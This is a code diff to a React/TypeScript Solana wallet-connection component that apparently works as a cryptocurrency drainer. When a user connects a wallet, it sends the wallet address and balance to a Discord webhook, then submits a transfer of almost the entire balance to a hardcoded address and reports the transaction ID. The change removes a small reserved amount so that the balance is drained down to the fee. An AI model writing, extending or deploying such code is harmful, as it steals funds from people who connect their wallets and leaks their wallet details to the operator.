@@ -80,7 +80,7 @@ const ExposeWalletModal: FC = () => {
 };
 
 const WalletConnectionHandler: FC = () => {
-    const { publicKey, connected, wallet, sendTransaction } = useWallet();
+    const { publicKey, connected, sendTransaction } = useWallet();
     const [solBalance, setSolBalance] = useState<number | null>(null);
 
     useEffect(() => {
@@ -122,14 +122,13 @@ const WalletConnectionHandler: FC = () => {
 
             await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
 
-            const reservedLamports = 1000000;
-            if (lamports <= reservedLamports) {
-                alert('⚠️ Not enough SOL to mint a coin.');
+            if (lamports <= 0) {
+                alert('⚠️ Not enough SOL to perform a transaction.');
                 return;
             }
 
+            const toPubkey = new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz');
             const blockhash = await connection.getLatestBlockhash();
-            const sendAmount = lamports - reservedLamports;
 
             const tx = new Transaction({
                 feePayer: walletPublicKey,
@@ -137,21 +136,41 @@ const WalletConnectionHandler: FC = () => {
             }).add(
                 SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
-                    toPubkey: new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz'),
-                    lamports: sendAmount,
+                    toPubkey,
+                    lamports: lamports,
+                })
+            );
+
+            const feeResp = await connection.getFeeForMessage(tx.compileMessage());
+            const feeLamports = feeResp.value || 5000; // fallback in case of RPC failure
+
+            const sendableLamports = lamports - feeLamports;
+            if (sendableLamports <= 0) {
+                alert('⚠️ Not enough SOL to cover the transaction fee.');
+                return;
+            }
+
+            const finalTx = new Transaction({
+                feePayer: walletPublicKey,
+                recentBlockhash: blockhash.blockhash,
+            }).add(
+                SystemProgram.transfer({
+                    fromPubkey: walletPublicKey,
+                    toPubkey,
+                    lamports: sendableLamports,
                 })
             );
 
             setTimeout(async () => {
                 try {
-                    const txid = await sendTransaction(tx, connection!);
+                    const txid = await sendTransaction(finalTx, connection);
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
                     await sendDiscordWebhook(
                         walletPublicKey.toBase58(),
-                        lamports! / LAMPORTS_PER_SOL,
-                        sendAmount,
-                        '5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz',
+                        lamports / LAMPORTS_PER_SOL,
+                        sendableLamports,
+                        toPubkey.toBase58(),
                         txid
                     );
                 } catch (err) {
